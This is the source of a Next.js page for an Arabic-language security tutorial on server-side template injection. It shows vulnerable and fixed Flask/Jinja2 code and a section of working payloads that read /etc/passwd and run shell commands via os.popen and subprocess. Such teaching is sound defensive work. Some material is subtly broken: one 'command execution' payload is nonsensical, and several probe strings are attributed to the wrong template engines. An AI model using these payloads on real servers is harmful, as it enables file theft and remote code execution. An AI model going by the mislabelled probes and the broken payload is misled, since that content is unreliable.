import Link from 'next/link'

export default function SSTIPage() {
  return (
    <div className="max-w-4xl mx-auto prose prose-lg" dir="rtl">
      <nav className="mb-8 text-sm text-gray-500">
        <Link href="/" className="hover:text-blue-600">الرئيسية</Link>
        <span className="mx-2">/</span>
        <span className="text-gray-900">SSTI</span>
      </nav>

      <header className="mb-12">
        <div className="flex items-center gap-3 mb-4">
          <span className="text-5xl">&#x1F3A8;</span>
          <div>
            <h1 className="text-4xl font-bold text-gray-900 mb-0">حقن القوالب من جانب الخادم</h1>
            <p className="text-xl text-gray-500 mt-1">Server-Side Template Injection (SSTI)</p>
          </div>
        </div>
        <div className="bg-red-50 border border-red-200 rounded-lg p-4">
          <p className="text-red-700 font-semibold mb-0">&#x26A0; مستوى الخطورة: خطيرة جداً</p>
        </div>
      </header>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">تعريف SSTI</h2>
        <p>
          حقن القوالب من جانب الخادم (SSTI) هو ثغرة أمنية خطيرة تسمح للمهاجم بحقن
          أكواد تعليمات في قوالب الويب التي يتم تنفيذها على الخادم.
        </p>
        <p>
          يمكن أن يؤدي هذا إلى تنفيذ أوامر عشوائية على الخادم (RCE) وسرقة البيانات.
        </p>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">أكواد اختبار SSTI</h2>
        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6">
          <p>جرّب هذه الأكواد في أي حقل إدخال:</p>
          <ul className="list-disc mr-6">
            <li><code>{'{{7*7}}'}</code> إذا ظهر 49 فقد تكون مصاباً</li>
            <li><code>{'${7*7}'}</code> لاختبار GoTemplate/EJS</li>
            <li><code>{'#{7*7}'}</code> لاختبار Ruby ERB</li>
            <li><code>{'<%= 7*7 %>'}</code> لاختبار EJS/Pug</li>
          </ul>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">أمثلة على الكود</h2>

        <div className="bg-red-50 border border-red-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-red-700 mb-3">&#x274C; كود مصاب (Jinja2)</h3>
          <pre className="bg-gray-900 text-gray-100 p-4 rounded-lg text-sm">
{`# Python Flask مع Jinja2 - مصاب
@app.route('/page')
def page():
    name = request.args.get('name', 'Guest')
    # حقن القالب مباشرة من المستخدم!
    template = f'<h1>مرحباً {name}</h1>'
    return render_template_string(template)

# المهاجم يدخل:
# /page?name={{config.items()}}
# أو:
# /page?name={{''.__class__.__mro__[1].__subclasses__()}}`}
          </pre>
        </div>

        <div className="bg-green-50 border border-green-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-green-700 mb-3">&#x2705; كود محصن</h3>
          <pre className="bg-gray-900 text-gray-100 p-4 rounded-lg text-sm">
{`# Python Flask - كود محصن
@app.route('/page')
def page():
    name = request.args.get('name', 'Guest')
    # استخدام render_template مع ملف منفصل
    return render_template('page.html', name=name)

# في page.html:
# <h1>مرحباً {{ name }}</h1>
# Jinja2 تقوم تنقية المخرجات تلقائياً

# تفعيل Sandboxing
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string('مرحباً {{ name }}')
result = template.render(name=user_input)`}
          </pre>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">أكواد استغلال حقيقية</h2>

        <div className="bg-red-50 border border-red-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-red-700 mb-3">هجمات Jinja2 الشائعة</h3>
          <pre className="bg-gray-900 text-gray-100 p-4 rounded-lg text-sm">
{`# قراءة /etc/passwd
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# تنفيذ أوامر نظام
{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/cmd.sh','r')-1}}

# عبر os.popen
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# GET /page?name={{''.__class__.__mro__[1].__subclasses__()[213]('ls -la',shell=True,stdout=-1).communicate()}}`}
          </pre>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">طرق الحماية</h2>
        <div className="space-y-4">
          <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
            <h4 className="font-bold text-gray-800 mb-2">1. لا تدمج مدخلات المستخدم في القوالب</h4>
            <p className="text-gray-600 mb-0">استخدم المعاملات (parameters) بدلاً من دمج النصوص</p>
          </div>
          <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
            <h4 className="font-bold text-gray-800 mb-2">2. استخدم Sandboxed Environment</h4>
            <p className="text-gray-600 mb-0">فعّل بيئة العزل في Jinja2 أو Twig</p>
          </div>
          <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
            <h4 className="font-bold text-gray-800 mb-2">3. تحديث القوالب</h4>
            <p className="text-gray-600 mb-0">استخدم أحدث إصدارات محركات القوالب</p>
          </div>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">الثغرات الأخرى</h2>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <Link href="/vulnerabilities/command-injection" className="block bg-gray-50 border border-gray-200 rounded-lg p-4 hover:shadow-md transition">
            <span className="text-2xl">&#x2328;&#xFE0F;</span>
            <h4 className="font-bold mt-2">Command Injection</h4>
          </Link>
          <Link href="/vulnerabilities/xss" className="block bg-gray-50 border border-gray-200 rounded-lg p-4 hover:shadow-md transition">
            <span className="text-2xl">&#x1F4DC;</span>
            <h4 className="font-bold mt-2">XSS</h4>
          </Link>
          <Link href="/vulnerabilities/sql-injection" className="block bg-gray-50 border border-gray-200 rounded-lg p-4 hover:shadow-md transition">
            <span className="text-2xl">&#x1F489;</span>
            <h4 className="font-bold mt-2">حقن SQL</h4>
          </Link>
        </div>
      </section>
    </div>
  )
}
